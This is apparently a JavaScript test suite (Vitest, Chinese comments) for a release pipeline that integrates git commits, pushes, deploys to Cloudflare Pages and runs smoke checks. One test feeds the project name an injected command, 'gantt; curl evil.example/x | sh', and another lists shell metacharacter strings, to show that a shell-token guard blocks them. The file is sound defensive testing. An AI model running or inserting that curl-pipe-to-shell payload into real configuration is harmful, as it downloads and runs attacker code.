/**
 * [SCN-FWB-033] 执行器交付管线（阶段二）——集成 → 验证 → push → （按面部署+冒烟）→ 终态。
 *
 * 事件序列与 payload 形状照 GitHub 交付线（feedback-delivery.yml）与 Worker 状态机：
 * 每个 payload 都带身份回显（integration.started 逐字段核验）、
 * `integration.verification_completed` 与 `release.completed` 必须带 `passed`、
 * 部署证据的 `deployedCommit` 必须等于集成提交。
 */
import { describe, expect, it } from 'vitest';
import { assertShellSafeToken, createReleasePipeline } from '../executor/release-pipeline.js';

const BASE = 'a'.repeat(40);
const CHANGE = 'b'.repeat(40);
const PICKED = 'e'.repeat(40);
const SHA = 'c'.repeat(64);

function claimFor(overrides = {}) {
    return {
        releaseId: 'rel_x1',
        issueId: 'issue_x1',
        candidateId: 'cnd_x1',
        status: 'integrating',
        releaseToken: 'tok.sig',
        // SCN-FWB-033（2026-09-03 收紧）：pages 部署的产物目录与构建命令是项目数据，
        // 缺失即 fail-closed。夹具照生产 feedback_projects 的配置给全。
        deployConfig: {
            pagesProject: 'gantt-task-editor',
            branch: 'master',
            pagesOutputDir: 'dist-cn',
            pagesBuildCommand: 'npm run build',
        },
        payload: {
            releaseId: 'rel_x1',
            issueId: 'issue_x1',
            candidateId: 'cnd_x1',
            repository: '2440893398/gantt-task-editor',
            baseRef: 'master',
            baseCommit: BASE,
            candidateRef: 'feedback/candidate/run_x1',
            changeCommit: CHANGE,
            changedFiles: ['doc/guide/x.md'],
            diffManifestSha256: SHA,
            deploymentRequired: false,
            deploymentTarget: null,
            productionOrigin: 'https://prod.example.test',
            smokeUrls: [],
            ...overrides,
        },
    };
}

function fakeGit({
    originHead = BASE,
    cherryPickFails = false,
    pushFails = false,
    alreadyMerged = false,
} = {}) {
    const calls = [];
    const git = async (...args) => {
        const joined = args.join(' ');
        calls.push(joined);
        // `merge-base --is-ancestor` 用退出码回答问题：0 = 是祖先。默认不是。
        if (joined.startsWith('merge-base --is-ancestor') && !alreadyMerged) {
            const error = new Error('EXECUTOR_GIT_FAILED: not an ancestor');
            error.code = 'EXECUTOR_GIT_FAILED';
            throw error;
        }
        if (joined.startsWith('rev-parse origin/'))
            return { code: 0, stdout: `${originHead}\n`, stderr: '' };
        if (joined.startsWith('rev-parse HEAD'))
            return { code: 0, stdout: `${PICKED}\n`, stderr: '' };
        if (joined.startsWith('cherry-pick') && cherryPickFails && !joined.includes('--abort')) {
            const error = new Error('EXECUTOR_GIT_FAILED: conflict');
            error.code = 'EXECUTOR_GIT_FAILED';
            throw error;
        }
        if (joined.startsWith('push') && pushFails) {
            const error = new Error('EXECUTOR_GIT_FAILED: non-fast-forward');
            error.code = 'EXECUTOR_GIT_FAILED';
            throw error;
        }
        return { code: 0, stdout: '', stderr: '' };
    };
    git.calls = calls;
    return git;
}

function makePipeline({
    git = fakeGit(),
    verification = null,
    commandResults = {},
    fetchResponses = [],
} = {}) {
    const events = [];
    const commands = [];
    const controlPlane = {
        async postReleaseEvent({ releaseId, releaseToken, event }) {
            events.push({ releaseId, releaseToken, type: event.type, payload: event.payload });
            return { duplicate: false };
        },
    };
    const pipeline = createReleasePipeline({
        workspaceDir: 'C:/ws',
        childEnv: { PATH: 'p' },
        log: () => {},
        gitFactory: () => git,
        runVerification: async () =>
            verification ?? {
                passed: true,
                report: {
                    targetedTests: { command: 'npm test', required: true, passed: true },
                    build: { command: 'npm run build', required: true, passed: true },
                    playwright: { command: 'npm run test:e2e', required: false, passed: true },
                },
            },
        runCommandImpl: async ({ command }) => {
            commands.push(command);
            return (
                commandResults[command] ?? { ok: true, exitCode: 0, timedOut: false, output: '' }
            );
        },
        fsImpl: { existsSync: (p) => true },
        fetchImpl: async (url) => {
            const next = fetchResponses.shift() ?? { status: 200 };
            // 真实响应带 content-type：坏部署的形态正是「200 + text/html」，
            // 只给 status 的假响应会让这类故障在测试里根本无法表达。
            const contentType =
                next.contentType ??
                (String(url).includes('/api/') ? 'application/json' : 'text/html; charset=utf-8');
            return {
                status: next.status,
                url,
                headers: {
                    get: (name) =>
                        String(name).toLowerCase() === 'content-type' ? contentType : null,
                },
            };
        },
    });
    return { pipeline, events, commands, controlPlane, git };
}

describe('[SCN-FWB-033] docs-only 交付（deploymentRequired=false）', () => {
    it('base 未动：fast-forward 候选提交本身，push 真实 ref，事件序列完整', async () => {
        const git = fakeGit({ originHead: BASE });
        const { pipeline, events, controlPlane } = makePipeline({ git });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('completed');
        expect(events.map((e) => e.type)).toEqual([
            'integration.started',
            'integration.rebased',
            'integration.verification_completed',
            'integration.merged',
            'release.completed',
        ]);
        // fetch 实时 origin，不信本地 ref
        expect(git.calls.some((c) => c.startsWith('fetch origin master'))).toBe(true);
        // ff：集成提交就是候选提交
        expect(events[1].payload.integrationCommit).toBe(CHANGE);
        expect(git.calls).toContain(`push origin ${CHANGE}:refs/heads/master`);
        // 身份回显 + passed
        expect(events[0].payload).toMatchObject({
            candidateId: 'cnd_x1',
            baseCommit: BASE,
            changeCommit: CHANGE,
            diffManifestSha256: SHA,
            deploymentRequired: false,
        });
        expect(events[2].payload.passed).toBe(true);
        expect(events[4].payload.passed).toBe(true);
        expect(events[4].payload.integrationCommit).toBe(CHANGE);
    });

    it('base 前移：cherry-pick 重放，集成提交是新头', async () => {
        const moved = 'f'.repeat(40);
        const git = fakeGit({ originHead: moved });
        const { pipeline, events, controlPlane } = makePipeline({ git });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('completed');
        expect(
            git.calls.some((c) => c.startsWith(`checkout -B feedback/release/rel_x1 ${moved}`))
        ).toBe(true);
        expect(git.calls.some((c) => c.startsWith(`cherry-pick ${CHANGE}`))).toBe(true);
        expect(events[1].payload.integrationCommit).toBe(PICKED);
        expect(git.calls).toContain(`push origin ${PICKED}:refs/heads/master`);
    });

    it('cherry-pick 冲突：abort 后以 review_required 失败——服务端会产生 HumanAction', async () => {
        const git = fakeGit({ originHead: 'f'.repeat(40), cherryPickFails: true });
        const { pipeline, events, controlPlane } = makePipeline({ git });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('failed');
        expect(result.errorCode).toBe('review_required');
        expect(git.calls).toContain('cherry-pick --abort');
        expect(events.at(-1).type).toBe('release.failed');
        expect(events.at(-1).payload.errorCode).toBe('review_required');
        expect(git.calls.every((c) => !c.startsWith('push'))).toBe(true);
    });

    it('集成验证失败：verification_completed 如实 passed=false，release.failed，不 push', async () => {
        const { pipeline, events, controlPlane, git } = makePipeline({
            verification: {
                passed: false,
                failedStep: 'targetedTests',
                failureOutput: '2 failed',
                report: {
                    targetedTests: { command: 'npm test', required: true, passed: false },
                    build: { command: 'npm run build', required: true, passed: false },
                    playwright: { command: 'npm run test:e2e', required: false, passed: true },
                },
            },
        });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('failed');
        expect(result.errorCode).toBe('integration_verification_failed');
        const verificationEvent = events.find(
            (e) => e.type === 'integration.verification_completed'
        );
        expect(verificationEvent.payload.passed).toBe(false);
        expect(events.at(-1).type).toBe('release.failed');
        expect(git.calls.every((c) => !c.startsWith('push'))).toBe(true);
    });

    it('push 被拒：default_branch_drift（可恢复失败，Release 状态由服务端保持不变）', async () => {
        const git = fakeGit({ originHead: BASE, pushFails: true });
        const { pipeline, events, controlPlane } = makePipeline({ git });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('failed');
        expect(result.errorCode).toBe('default_branch_drift');
        expect(events.at(-1).type).toBe('release.failed');
        expect(events.at(-1).payload.errorCode).toBe('default_branch_drift');
    });
});

describe('[SCN-FWB-033] pages 交付（deploymentRequired=true）', () => {
    const pagesClaim = () =>
        claimFor({
            changedFiles: ['src/app.js'],
            deploymentRequired: true,
            deploymentTarget: 'pages',
            smokeUrls: ['/'],
        });
    const DEPLOYMENT_ID = '12345678-1234-4234-9234-123456789abc';

    it('部署→冒烟→完成：deployedCommit 恒等于集成提交，冒烟检查逐路径断言', async () => {
        const { pipeline, events, commands, controlPlane } = makePipeline({
            commandResults: {},
            fetchResponses: [{ status: 200 }],
        });
        const result = await pipeline.deliver({
            claim: pagesClaim(),
            controlPlane,
            resolveDeploymentIdImpl: async () => DEPLOYMENT_ID,
        });

        expect(result.outcome).toBe('completed');
        expect(events.map((e) => e.type)).toEqual([
            'integration.started',
            'integration.rebased',
            'integration.verification_completed',
            'integration.merged',
            'deployment.started',
            'deployment.completed',
            'smoke.completed',
            'release.completed',
        ]);
        expect(commands.some((c) => c.includes('pages deploy'))).toBe(true);
        const deployment = events.find((e) => e.type === 'deployment.completed');
        expect(deployment.payload).toMatchObject({
            deploymentTarget: 'pages',
            deploymentId: DEPLOYMENT_ID,
            deployedCommit: CHANGE,
        });
        const smoke = events.find((e) => e.type === 'smoke.completed');
        expect(smoke.payload.passed).toBe(true);
        expect(smoke.payload.checks).toEqual([{ path: '/', status: 200, assertion: 'status_2xx' }]);
        expect(smoke.payload.deploymentId).toBe(DEPLOYMENT_ID);
    });

    it('冒烟失败：smoke.completed 如实 passed=false，随后 release.failed', async () => {
        const { pipeline, events, controlPlane } = makePipeline({
            fetchResponses: [{ status: 500 }],
        });
        const result = await pipeline.deliver({
            claim: pagesClaim(),
            controlPlane,
            resolveDeploymentIdImpl: async () => DEPLOYMENT_ID,
        });

        expect(result.outcome).toBe('failed');
        expect(result.errorCode).toBe('smoke_failed');
        const smoke = events.find((e) => e.type === 'smoke.completed');
        expect(smoke.payload.passed).toBe(false);
        expect(events.at(-1).type).toBe('release.failed');
    });

    it('/api/feedback/issues 的 401 是合格冒烟——受保护端点要求认证正是预期行为', async () => {
        const { pipeline, events, controlPlane } = makePipeline({
            fetchResponses: [{ status: 200 }, { status: 401 }],
        });
        const result = await pipeline.deliver({
            claim: claimFor({
                changedFiles: ['workers/share-worker.js'],
                deploymentRequired: true,
                deploymentTarget: 'worker',
                smokeUrls: ['/feedback', '/api/feedback/issues'],
            }),
            controlPlane,
            resolveDeploymentIdImpl: async () => DEPLOYMENT_ID,
        });

        expect(result.outcome).toBe('completed');
        const smoke = events.find((e) => e.type === 'smoke.completed');
        expect(smoke.payload.checks).toEqual([
            { path: '/feedback', status: 200, assertion: 'status_2xx' },
            { path: '/api/feedback/issues', status: 401, assertion: 'protected_auth_required' },
        ]);
    });
});

describe('[SCN-FWB-033] Pages 部署产物由项目数据决定（生产事故 2026-09-03）', () => {
    const DEPLOYMENT_ID = '12345678-1234-4234-9234-123456789abc';

    function pagesClaimWith(deployConfig) {
        const claim = claimFor({
            changedFiles: ['src/app.js'],
            deploymentRequired: true,
            deploymentTarget: 'pages',
            smokeUrls: ['/'],
        });
        return { ...claim, deployConfig };
    }

    it('按 deployConfig 部署 dist-cn 并先跑 CN 构建——写死 dist 会把 _worker.js 从 Pages 上抹掉', async () => {
        // 生产实锤：管线写死 `pages deploy dist`（国际版静态站），部署后 Pages 上
        // 没有 _worker.js，/feedback 与全部 /api/* 落到 SPA 静态兜底，首页还从
        // vendored dhtmlx 9.1.1 变成 CDN 10.0。产物目录与构建命令必须来自项目数据。
        const { pipeline, commands, controlPlane } = makePipeline({
            commandResults: {
                'npx wrangler pages deployment list --project-name gantt-task-editor': {
                    ok: true,
                    exitCode: 0,
                    timedOut: false,
                    output: DEPLOYMENT_ID,
                },
            },
            fetchResponses: [{ status: 200 }],
        });

        const result = await pipeline.deliver({
            claim: pagesClaimWith({
                pagesProject: 'gantt-task-editor',
                branch: 'master',
                pagesOutputDir: 'dist-cn',
                pagesBuildCommand: 'npm run build',
            }),
            controlPlane,
        });

        expect(result.outcome).toBe('completed');
        const deployCommand = commands.find((command) => command.includes('pages deploy'));
        expect(deployCommand).toContain('pages deploy dist-cn');
        expect(deployCommand).not.toContain('pages deploy dist ');
        // 构建必须发生在部署之前，否则部署的是上一次的产物。
        const buildIndex = commands.indexOf('npm run build');
        expect(buildIndex).toBeGreaterThanOrEqual(0);
        expect(buildIndex).toBeLessThan(commands.indexOf(deployCommand));
    });

    it('缺 pagesOutputDir 时以 blocked_external 停下，绝不回落默认目录', async () => {
        // 静默的默认值正是本次事故的形态：配置没说部署什么，就不许猜。
        const { pipeline, commands, events, controlPlane } = makePipeline({
            fetchResponses: [{ status: 200 }],
        });

        const result = await pipeline.deliver({
            claim: pagesClaimWith({ pagesProject: 'gantt-task-editor', branch: 'master' }),
            controlPlane,
        });

        expect(result.errorCode).toBe('blocked_external');
        expect(commands.some((command) => command.includes('pages deploy'))).toBe(false);
        expect(events.some((event) => event.type === 'deployment.completed')).toBe(false);
    });

    it('冒烟必须证明 Functions 仍在接管：/api 返回 200 但 text/html 判失败', async () => {
        // 坏部署下 `/` 与 `/feedback` 照样 200（静态兜底返回首页），只看状态码
        // 的冒烟会全绿放行——判据必须落在「这条 API 真的由 Worker 回答」上。
        const { pipeline, events, controlPlane } = makePipeline({
            commandResults: {
                'npx wrangler pages deployment list --project-name gantt-task-editor': {
                    ok: true,
                    exitCode: 0,
                    timedOut: false,
                    output: DEPLOYMENT_ID,
                },
            },
            fetchResponses: [
                { status: 200 },
                { status: 200, contentType: 'text/html; charset=utf-8' },
            ],
        });

        const claim = pagesClaimWith({
            pagesProject: 'gantt-task-editor',
            branch: 'master',
            pagesOutputDir: 'dist-cn',
            pagesBuildCommand: 'npm run build',
        });
        claim.payload.smokeUrls = ['/', '/api/feedback/issues'];

        const result = await pipeline.deliver({ claim, controlPlane });

        expect(result.errorCode).toBe('smoke_failed');
        const smoke = events.find((event) => event.type === 'smoke.completed');
        expect(smoke.payload.passed).toBe(false);
        expect(
            smoke.payload.checks.find((check) => check.path === '/api/feedback/issues').assertion
        ).toBe('unexpected_content_type');
    });
});

describe('[SCN-FWB-035] S2 凭据在交付路径上真的被接上（评审 §1.2）', () => {
    // 坏行为画像：准入校验 HTTPS remote + 专用 PAT，release 却用工作区自己的 origin
    // 与开发者的全局 credential helper 去 push——校验的和推的可以是两个仓库。
    function pipelineWith({
        credentials,
        originUrl = 'https://github.com/2440893398/gantt-task-editor.git',
    }) {
        const factoryArgs = [];
        const git = fakeGit();
        const inner = git;
        const wrapped = async (...args) => {
            if (args.join(' ') === 'remote get-url origin') {
                return { code: 0, stdout: `${originUrl}\n`, stderr: '' };
            }
            return inner(...args);
        };
        wrapped.calls = git.calls;
        const events = [];
        const pipeline = createReleasePipeline({
            workspaceDir: 'C:/ws',
            childEnv: { PATH: 'p' },
            credentials,
            log: () => {},
            gitFactory: (options) => {
                factoryArgs.push(options);
                return wrapped;
            },
            runVerification: async () => ({
                passed: true,
                report: {
                    targetedTests: { command: 'npm test', required: true, passed: true },
                    build: { command: 'npm run build', required: true, passed: true },
                    playwright: { command: 'npm run test:e2e', required: false, passed: true },
                },
            }),
            runCommandImpl: async () => ({ ok: true, exitCode: 0, timedOut: false, output: '' }),
            fsImpl: { existsSync: () => true },
            fetchImpl: async () => ({ status: 200 }),
        });
        const controlPlane = {
            async postReleaseEvent({ event }) {
                events.push({ type: event.type, payload: event.payload });
                return { duplicate: false };
            },
        };
        return { pipeline, controlPlane, events, factoryArgs, git: wrapped };
    }

    it('isolated：git runner 拿到隔离凭据参数与白名单环境，origin 同源时照常交付', async () => {
        const { pipeline, controlPlane, factoryArgs } = pipelineWith({
            credentials: {
                mode: 'isolated',
                remoteUrl: 'https://github.com/2440893398/gantt-task-editor',
                pat: 'github_pat_x',
            },
        });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });
        expect(result.outcome).toBe('completed');
        expect(factoryArgs[0].env).toEqual({ PATH: 'p' });
        expect(factoryArgs[0].credentialArgs).toContain('credential.helper=');
        expect(factoryArgs[0].credentialArgs.join(' ')).toContain(
            'http.extraheader=Authorization:'
        );
        // PAT 原文不进 argv
        expect(factoryArgs[0].credentialArgs.join(' ')).not.toContain('github_pat_x');
    });

    it('isolated：origin 指向别的仓库时以 blocked_external 停下，绝不 push', async () => {
        const { pipeline, controlPlane, events, git } = pipelineWith({
            credentials: {
                mode: 'isolated',
                remoteUrl: 'https://github.com/2440893398/gantt-task-editor',
                pat: 'github_pat_x',
            },
            originUrl: 'https://github.com/someone-else/gantt-task-editor.git',
        });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });
        expect(result).toMatchObject({ outcome: 'failed', errorCode: 'blocked_external' });
        expect(events.map((e) => e.type)).toEqual(['release.failed']);
        expect(git.calls.some((call) => call.startsWith('push'))).toBe(false);
    });

    it('inherited：不注入任何凭据参数——这条路上 S2 不成立，且不做同源核对', async () => {
        const { pipeline, controlPlane, factoryArgs, git } = pipelineWith({
            credentials: { mode: 'inherited', remoteUrl: '', pat: '' },
        });
        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });
        expect(result.outcome).toBe('completed');
        expect(factoryArgs[0].credentialArgs).toEqual([]);
        expect(git.calls.some((call) => call === 'remote get-url origin')).toBe(false);
    });
});

describe('[SCN-FWB-035] Release 租约凭证随每条事件上报（评审 §3.2）', () => {
    it('认领拿到的 leaseEpoch 出现在每一条事件上——不带它服务端一律 409', async () => {
        const posted = [];
        const { pipeline } = makePipeline();
        const controlPlane = {
            async postReleaseEvent(args) {
                posted.push(args);
                return { duplicate: false };
            },
        };
        await pipeline.deliver({ claim: { ...claimFor(), leaseEpoch: 3 }, controlPlane });
        expect(posted.length).toBeGreaterThan(0);
        expect(posted.every((call) => call.leaseEpoch === 3)).toBe(true);
    });

    it('租约易主（409 StaleLease）时抛出，交由守护循环停手——不继续 push/部署', async () => {
        const git = fakeGit();
        const { pipeline } = makePipeline({ git });
        const controlPlane = {
            async postReleaseEvent() {
                const error = new Error('FEEDBACK_EXECUTOR_LEASE_STALE');
                error.code = 'FEEDBACK_EXECUTOR_LEASE_STALE';
                throw error;
            },
        };
        const error = await pipeline
            .deliver({ claim: { ...claimFor(), leaseEpoch: 1 }, controlPlane })
            .catch((e) => e);
        expect(error.code).toBe('FEEDBACK_EXECUTOR_LEASE_STALE');
        expect(git.calls.some((call) => call.startsWith('push'))).toBe(false);
    });
});

/**
 * [SCN-FWB-035] 拼进 shell 的标识符必须先过字符集（代码评审 2026-09-02 §1.7）。
 *
 * 部署命令是 `shell: true` 下的字符串拼接，`pagesProject`/`baseRef`/`integrationCommit`
 * 全部来自控制面数据。「控制面受信」是一层假设而不是一道防线——Worker 被攻破或 D1
 * 被注入的那一刻，它等价于开发机上的任意命令执行。
 */
describe('[SCN-FWB-035] 部署命令的字符集闸', () => {
    it('pagesProject 带命令分隔符时拒绝构造命令，且绝不执行部署', async () => {
        const commands = [];
        const events = [];
        const git = fakeGit();
        const pipeline = createReleasePipeline({
            workspaceDir: 'C:/ws',
            childEnv: { PATH: 'p' },
            log: () => {},
            gitFactory: () => git,
            runVerification: async () => ({
                passed: true,
                report: {
                    targetedTests: { command: 'npm test', required: true, passed: true },
                    build: { command: 'npm run build', required: true, passed: true },
                    playwright: { command: 'npm run test:e2e', required: false, passed: true },
                },
            }),
            runCommandImpl: async ({ command }) => {
                commands.push(command);
                return { ok: true, exitCode: 0, timedOut: false, output: '' };
            },
            fsImpl: { existsSync: () => true },
            fetchImpl: async () => ({ status: 200 }),
        });
        const controlPlane = {
            async postReleaseEvent({ event }) {
                events.push({ type: event.type, payload: event.payload });
                return { duplicate: false };
            },
        };

        const claim = {
            ...claimFor({ deploymentRequired: true, deploymentTarget: 'pages' }),
            deployConfig: { pagesProject: 'gantt; curl evil.example/x | sh' },
        };
        const result = await pipeline.deliver({ claim, controlPlane });

        expect(result).toMatchObject({ outcome: 'failed', errorCode: 'blocked_external' });
        // 坏行为下这里会有一条把注入串原样拼进去的 wrangler 命令。
        expect(commands.some((command) => command.includes('curl evil.example'))).toBe(false);
        expect(events.at(-1).payload.summary).toContain('deployConfig.pagesProject');
    });

    it('正常的项目名与提交号照常通过', () => {
        expect(assertShellSafeToken('pagesProject', 'gantt-task-editor')).toBe('gantt-task-editor');
        expect(assertShellSafeToken('integrationCommit', 'a'.repeat(40))).toBe('a'.repeat(40));
        expect(assertShellSafeToken('baseRef', 'release/2026-09')).toBe('release/2026-09');
        for (const bad of ['a b', 'a;b', 'a`b`', 'a$(b)', 'a|b', 'a&b', '', '  ']) {
            expect(() => assertShellSafeToken('x', bad)).toThrow('EXECUTOR_UNSAFE_SHELL_TOKEN');
        }
    });
});

/**
 * [SCN-FWB-033] 「push 成功、deploy 失败」之后的重跑（代码评审 2026-09-02 §3.9）。
 */
describe('[SCN-FWB-033] 重领时先认已合入的候选', () => {
    it('候选已经在 origin 历史里时跳过集成，直接续跑部署——不再误报 review_required', async () => {
        // 坏行为画像：重领后 originHead 已不等于 baseCommit（因为上一轮 push 成功了），
        // 于是走 cherry-pick 分支；而那个提交已经在历史里，cherry-pick 以「空提交」
        // 报错，被判成 review_required——一次本该只重跑部署的恢复，变成一张
        // 「候选无法安全集成」的人工卡，而候选其实好好地躺在 master 上。
        const git = fakeGit({ originHead: 'f'.repeat(40), alreadyMerged: true });
        const { pipeline, events, controlPlane } = makePipeline({ git });

        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('completed');
        expect(git.calls.some((call) => call.startsWith('cherry-pick'))).toBe(false);
        // 集成提交就是候选提交本身——它已经是 origin 历史的一部分。
        expect(
            events.find((event) => event.type === 'integration.rebased').payload.integrationCommit
        ).toBe(CHANGE);
    });

    it('已合入的候选不再 push——否则基线再前进一步，交付就变成永动循环', async () => {
        // 坏行为画像：alreadyMerged 分支自称「跳过集成直达部署」，但 push 没跳。
        // push 成功后交付中途崩溃 → 租约过期重领，期间 master 又合入了别的提交 →
        // 判已合入 → 完整跑 npm ci + 验证 → push 祖先提交被真 git 以
        // non-fast-forward 拒绝 → default_branch_drift（可恢复，放租约）→ 重领 →
        // 永远循环：每轮烧一次完整验证，Release 永不终态、也不出人工卡。
        const git = fakeGit({
            originHead: 'f'.repeat(40),
            alreadyMerged: true,
            pushFails: true,
        });
        const { pipeline, events, controlPlane } = makePipeline({ git });

        const result = await pipeline.deliver({ claim: claimFor(), controlPlane });

        expect(result.outcome).toBe('completed');
        expect(git.calls.some((call) => call.startsWith('push'))).toBe(false);
        // 服务端状态机仍要看到 merged 事件才能推进到部署段。
        expect(events.some((event) => event.type === 'integration.merged')).toBe(true);
    });

    it('事件 id 掺入 leaseEpoch——重领带来的新事实不会被当成重放丢掉', async () => {
        const posted = [];
        const { pipeline } = makePipeline();
        const controlPlane = {
            async postReleaseEvent(args) {
                posted.push(args.event.eventId);
                return { duplicate: false };
            },
        };
        await pipeline.deliver({ claim: { ...claimFor(), leaseEpoch: 2 }, controlPlane });
        expect(posted[0]).toBe('executor-e2-1-integration.started');
        // 坏行为：eventId 只按序号编，第二次交付的第一条事件与第一次逐字相同，
        // 服务端按幂等去重丢弃——携带新 integrationCommit 的事实就此消失。
        expect(posted.every((id) => id.startsWith('executor-e2-'))).toBe(true);
    });
});
